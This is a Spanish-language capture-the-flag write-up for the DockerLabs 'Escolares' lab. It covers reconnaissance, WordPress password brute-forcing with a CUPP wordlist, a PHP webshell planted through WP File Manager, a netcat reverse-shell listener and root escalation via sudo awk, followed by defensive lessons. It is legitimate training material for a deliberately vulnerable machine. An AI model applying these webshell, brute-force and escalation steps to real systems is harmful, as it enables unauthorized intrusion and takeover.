# Escolares — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** Luisillo_o  
**Fecha de creación:** 09/06/2024  
**Técnicas:** Nmap · Código fuente HTML · /etc/hosts · CUPP · WPScan · WP File Manager · PHP webshell · Reverse Shell · awk/sudo

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — comentario con directorio y usuario admin](#2-enumeración-web--comentario-con-directorio-y-usuario-admin)
3. [WordPress — bypass con /etc/hosts](#3-wordpress--bypass-con-etchosts)
4. [CUPP + WPScan — wordlist contextual y acceso admin](#4-cupp--wpscan--wordlist-contextual-y-acceso-admin)
5. [WP File Manager — PHP webshell en tema](#5-wp-file-manager--php-webshell-en-tema)
6. [Acceso SSH como luisillo](#6-acceso-ssh-como-luisillo)
7. [Escalada de privilegios — awk/sudo](#7-escalada-de-privilegios--awksudo)
8. [Lección aprendida](#8-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh escolares.tar
```

> IP asignada: `172.17.0.2`.

Escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
cat Puertos
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
|_http-title: P\xc3\xa1gina Escolar Universitaria
```

---

## 2. Enumeración web — comentario con directorio y usuario admin

Visitamos `http://172.17.0.2` — Universidad de Ciberseguridad. Inspeccionamos el código fuente (`Ctrl+U`) y encontramos dos cosas:

```html
<!-- INFORMACION PERSONAL ACADEMICO -->
<!-- /profesores.html -->
```

Navegamos a `/profesores.html` y encontramos:

```
(admin wordpress)
Luis ;)
Matrícula: 19131337
Especialidad: Ingeniería en Sistemas
Fecha de Nacimiento: 09/10/1981
Email: luisillo@example.com
```

> 💡 El usuario de WordPress es **luisillo**. Tenemos nombre, apellidos, nickname, fecha de nacimiento — suficiente para generar una wordlist contextual con CUPP.

---

## 3. WordPress — bypass con /etc/hosts

Al intentar acceder al panel WordPress, la URL redirige a `escolares.dl`:

```
http://escolares.dl/wordpress/wp-login.php
```

Añadimos el dominio a `/etc/hosts`:

```bash
sudo nano /etc/hosts
# Añadir:
172.17.0.2    escolares.dl
```

---

## 4. CUPP + WPScan — wordlist contextual y acceso admin

Generamos una wordlist personalizada con los datos del profesor:

```bash
./cupp.py -i
```

```
> First Name: Luis
> Surname:
> Nickname: luisillo
> Birthdate (DDMMYYYY): 09101981
> [resto vacío]
```

```
[+] Saving dictionary to luis.txt, counting 1962 words.
```

Lanzamos WPScan con la wordlist generada:

```bash
wpscan --url http://172.17.0.2/wordpress/ --enumerate -U luisillo -P /home/caan31/Descargas/cupp/luis.txt
```

```
[!] Valid Combinations Found:
    Username: luisillo, Password: Luis1981
```

Accedemos al panel de WordPress con **luisillo:Luis1981**.

---

## 5. WP File Manager — PHP webshell en tema

Dentro del panel encontramos el plugin **WP File Manager** instalado. Este plugin permite editar y subir archivos directamente en los temas del servidor.

Navegamos al directorio del tema activo `twentytwentyfour` y creamos el fichero `prueba.php`:

```php
<?php
system($_GET['cmd']);
?>
```

Comprobamos RCE:

```
http://escolares.dl/wordpress/wp-content/themes/twentytwentyfour/prueba.php?cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Generamos reverse shell con revshells.com (IP 192.168.1.26, puerto 443):

```bash
sudo nc -lvnp 443
```

Ejecutamos el payload URL-encodeado → shell recibida.

Una vez dentro encontramos en `/home`:

```bash
www-data@15b8f31fbcee:/home$ cat secret.txt
luisillopasswordsecret
```

---

## 6. Acceso SSH como luisillo

```bash
www-data@15b8f31fbcee:/home$ su luisillo
Password: luisillopasswordsecret
luisillo@15b8f31fbcee:~$
```

---

## 7. Escalada de privilegios — awk/sudo

```bash
luisillo@15b8f31fbcee:~$ sudo -l
```

```
User luisillo may run the following commands on 15b8f31fbcee:
    (ALL) NOPASSWD: /usr/bin/awk
```

GTFObins para awk con sudo:

```bash
luisillo@15b8f31fbcee:~$ sudo awk 'BEGIN {system("/bin/sh")}'
# whoami
root
```

✅ Somos **root**.

---

## 8. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **Datos personales del admin en código fuente HTML** | `/profesores.html` | Wordlist contextual → acceso WordPress |
| **Contraseña débil basada en nombre+año** | WordPress admin | WPScan exitoso con CUPP |
| **Plugin WP File Manager con escritura en temas** | Panel WordPress | RCE via PHP |
| **Contraseña en fichero secret.txt accesible** | `/home/secret.txt` | Movimiento lateral |
| **awk con sudo** | `/usr/bin/awk` | Escalada a root |

**Para defenderse:**
- No publicar información personal de empleados en código fuente HTML.
- Las contraseñas basadas en nombre+año son trivialmente adivinables con CUPP.
- Desinstalar WP File Manager en producción — es RCE directa si el admin está comprometido.
- `awk` con sudo es una escalada garantizada. Revisar todos los sudoers.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
